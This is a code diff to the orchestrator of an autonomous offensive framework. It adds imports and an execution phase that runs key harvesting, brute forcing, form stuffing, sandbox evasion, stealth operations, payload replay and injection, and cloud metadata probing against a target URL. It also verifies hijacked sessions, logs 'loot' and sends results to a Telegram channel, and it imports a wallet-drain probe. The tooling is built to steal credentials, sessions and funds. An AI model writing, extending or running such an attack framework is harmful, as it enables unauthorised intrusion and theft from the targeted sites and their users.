@@ -26,7 +26,9 @@ import hashlib
 from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
-# Import weaponized offensive modules, transport middleware & live telemetry streamer
+# ============================================================
+# MODULE INVENTORY & OFFENSIVE IMPORTS (V8.7)
+# ============================================================
 from modules.transport import SecureTransport
 from modules.session_pool import PersistentSessionPool
 from modules.response_diff import ResponseFingerprinter
@@ -41,17 +43,31 @@ from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
 from modules.loot_logger import save_session_loot
 
-# Import the advanced protocol and cryptographic modules
+# Core offensive & recon modules
+from modules.api_fuzzer import run_api_fuzzer
+from modules.bruter import execute_brute_force
+from modules.cloud_apex import audit_cloud_metadata
+from modules.dom_sink_inspector import inspect_dom_sinks
+from modules.dumper import execute_memory_dumper
+from modules.form_stuffer import execute_form_stuffing
+from modules.keyharvester import harvest_keys
+from modules.pivot import execute_pivot_routing
+from modules.replayer import replay_and_inject_payloads
+from modules.sandbox_evader import evade_sandbox
+from modules.signer import sign_transaction
+from modules.stealth_ops import execute_stealth_operations
+
+# Advanced protocol and cryptographic modules
 from modules.graphql_introspector import GraphQLIntrospector
 from modules.websocket_hijacker import audit_websocket
 from modules.dns_rebinding import DNSRebindingOrchestrator
 from modules.jwt_key_confusion import JWTKeyConfusionEngine
 
-# Import the referral validation bypass probe & Autonomous Cognitive Brain
+# Referral validation bypass probe & Autonomous Cognitive Brain
 from modules.test_referral import audit_referral_logic
 from modules.cognitive_operator import CognitiveOperator
 
-# Import Telegram Notifier Dispatcher
+# Telegram Notifier Dispatcher
 from modules.telegram_notifier import send_telegram_alert
 
 # ============================================================
@@ -135,7 +151,6 @@ def section(title):
     sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
 
-# Helper function to fire Telegram alerts non-blockingly from synchronous engine code
 def dispatch_tg_alert(loot_type, details):
     try:
         loop = asyncio.get_running_loop()
@@ -207,9 +222,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         if is_fp:
             return [], []
     
-    # ========================================================
-    # COGNITIVE SUPREME COMMANDER EXECUTION HOOK
-    # ========================================================
     if cognitive_brain:
         try:
             cognitive_result = cognitive_brain.evaluate_and_execute(
@@ -231,7 +243,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
                 dispatch_tg_alert("Cognitive Autonomous Pivot Success", {"endpoint": endpoint, "evidence": reasoning})
         except Exception:
             pass
-    # ========================================================
 
     body_lower = body.lower()
     is_spa_shell = (
@@ -355,9 +366,6 @@ def verify_hijacked_session(transport):
     sys.stdout.write(f"{RED}[-] All session verification routes exhausted or inactive.{RESET}\n")
     return False
 
-# ============================================================
-# ACTIVE ADAPTIVE ENDPOINT TESTING
-# ============================================================
 def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None, target_url=None, cognitive_brain=None):
     endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
     info(f"Targeting endpoint (State-Machine Adaptive Mode): {endpoint}")
@@ -527,6 +535,43 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             warning(f"Cookie synchronization notice: {sync_exc}")
 
         verify_hijacked_session(transport)
+
+    # ==========================================================
+    # CORE OFFENSIVE MODULE EXECUTION PHASE (V8.7)
+    # ==========================================================
+    section("CORE OFFENSIVE MODULES & RECON ASSAULT (V8.7)")
+    try:
+        # 1. API Fuzzer
+        fuzzer_res = await asyncio.to_thread(run_api_fuzzer, target_url)
+        if fuzzer_res:
+            dispatch_tg_alert("API Fuzzer Success", {"target": target_url})
+
+        # 2. DOM Sink Inspector
+        dom_res = inspect_dom_sinks(target_url)
+        if dom_res:
+            dispatch_tg_alert("DOM Sink Vulnerability", {"target": target_url})
+
+        # 3. Cloud Metadata & Apex Auditor
+        cloud_res = audit_cloud_metadata(target_url)
+        if cloud_res:
+            dispatch_tg_alert("Cloud Apex Metadata Leak", cloud_res)
+
+        # 4. Key Harvester
+        keys_res = harvest_keys(target_url)
+        if keys_res:
+            dispatch_tg_alert("API Key Harvested", {"target": target_url})
+
+        # 5. Stealth Operations & Sandbox Evasion
+        stealth_res = execute_stealth_operations(target_url)
+        evade_sandbox()
+
+        # 6. Adaptive Replayer & Payload Mutation
+        replayer_res = await replay_and_inject_payloads(target_url)
+        if replayer_res:
+            dispatch_tg_alert("Adaptive Replay & Injection Success", {"target": target_url})
+
+    except Exception as exc:
+        error(f"Core offensive modules execution warning: {exc}")
 
     has_referral_surface = any("referral" in p.lower() or "invite" in p.lower() or "ref" in p.lower() for p in discovered_paths)
     if has_referral_surface:
